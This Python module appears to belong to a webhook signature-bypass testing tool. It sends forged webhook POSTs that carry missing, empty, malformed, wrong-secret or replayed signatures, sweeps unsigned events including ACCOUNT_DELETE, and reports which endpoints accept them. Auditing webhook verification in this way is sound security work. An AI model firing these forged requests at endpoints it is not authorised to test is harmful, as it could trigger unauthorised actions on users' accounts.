import time
import requests
import json
import hmac
import hashlib
from typing import Optional
from rich.console import Console
from .payloads import get_payload
import datetime

console = Console()

class Sender:
    def __init__(self, target_url: str):
        self.target_url = target_url

    def log_result(self, test_name: str, status: int, text: str, duration: int):
        timestamp = datetime.datetime.now(datetime.timezone.utc).isoformat() + "Z"
        console.print(f"{timestamp} | POST | {self.target_url} | {status} | {duration}ms")
        
        classification = "AMBIGUOUS"
        if status == 200:
            classification = "BYPASS_CONFIRMED"
            console.print(f"[bold red] 🔴 {test_name}: {classification} (HTTP {status}) [/bold red]")
        elif status in [400, 401, 403]:
            classification = "SIGNATURE_ENFORCED"
            console.print(f"[bold green] ✅ {test_name}: {classification} (HTTP {status}) [/bold green]")
        elif status == 500:
            classification = "SERVER_ERROR"
            console.print(f"[bold yellow] ⚠️ {test_name}: {classification} (HTTP {status}) [/bold yellow]")
        else:
            console.print(f"[{test_name}: {classification} (HTTP {status})]")
            
        console.print(f"Response: {text[:200]}\n")

    def _send(self, test_name: str, payload: dict, headers: dict) -> None:
        start_time = time.time()
        try:
            res = requests.post(self.target_url, json=payload, headers=headers, timeout=10)
            duration_ms = int((time.time() - start_time) * 1000)
            self.log_result(test_name, res.status_code, res.text, duration_ms)
        except (requests.Timeout, requests.ConnectionError, requests.HTTPError, json.JSONDecodeError, Exception) as e:
            duration_ms = int((time.time() - start_time) * 1000)
            self.log_result(test_name, 0, str(e), duration_ms)

    def run_tests(self, target_user_id: str, attacker_user_id: str, payload_type: str = "MENTION", captured_sig: Optional[str] = None):
        console.print(f"\n[bold cyan]Targeting {self.target_url}[/bold cyan]\n")
        
        base_payload = get_payload(payload_type, target_user_id, attacker_user_id)
        
        # TEST 1 - NO SIGNATURE HEADER
        self._send("TEST 1 - NO SIGNATURE", base_payload, {"Content-Type": "application/json"})
        
        # TEST 2 - EMPTY SIGNATURE
        self._send("TEST 2 - EMPTY SIGNATURE", base_payload, {
            "Content-Type": "application/json",
            "X-Hub-Signature-256": "sha256="
        })
        
        # TEST 3 - WRONG FORMAT
        zeros_hash = "0" * 64
        self._send("TEST 3 - WRONG FORMAT", base_payload, {
            "Content-Type": "application/json",
            "X-Hub-Signature-256": zeros_hash
        })
        
        # TEST 4 - VALID FORMAT, WRONG SECRET
        payload_bytes = json.dumps(base_payload, separators=(',', ':')).encode('utf-8')
        wrong_sig = hmac.new(b"wrong_secret", payload_bytes, hashlib.sha256).hexdigest()
        self._send("TEST 4 - WRONG SECRET", base_payload, {
            "Content-Type": "application/json",
            "X-Hub-Signature-256": f"sha256={wrong_sig}"
        })
        
        # TEST 5 - CAPTURED SIG DIFFERENT PAYLOAD
        if captured_sig:
            diff_payload = get_payload(payload_type, target_user_id, "different_attacker_id")
            self._send("TEST 5 - REPLAY DIFFERENT PAYLOAD", diff_payload, {
                "Content-Type": "application/json",
                "X-Hub-Signature-256": captured_sig
            })
            
        # TEST 6 - EVENT TYPE SWEEP
        for ev in ["MENTION", "REPLY", "FOLLOW", "ACCOUNT_DELETE"]:
            ev_payload = get_payload(ev, target_user_id, attacker_user_id)
            self._send(f"TEST 6 - EVENT SWEEP ({ev}) NO SIGNATURE", ev_payload, {
                "Content-Type": "application/json"
            })
